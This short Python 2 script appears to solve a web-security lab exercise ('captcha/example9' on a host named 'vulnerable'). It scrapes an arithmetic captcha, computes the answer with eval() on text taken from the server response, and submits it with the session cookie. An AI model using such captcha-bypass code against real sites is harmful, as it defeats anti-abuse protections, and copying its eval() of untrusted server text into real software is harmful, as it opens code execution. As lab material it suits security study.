import httplib
import re

if __name__ == '__main__':
    conn = httplib.HTTPConnection('vulnerable')
    conn.request('GET', '/captcha/example9/')
    res = conn.getresponse()
    cookie = res.getheader('Set-Cookie')
    expr = re.findall(r'<form action="submit" action="get">\n([^<]*)=', res.read())[0]
    value = eval(expr)
    headers = {'Cookie': cookie}
    conn.request('GET', '/captcha/example9/submit?captcha=%d&submit=Submit' % value, '', headers)
    res = conn.getresponse()
    if res.read().find('Success!!!') >= 0:
        print 'Success!!!'
    conn.close()
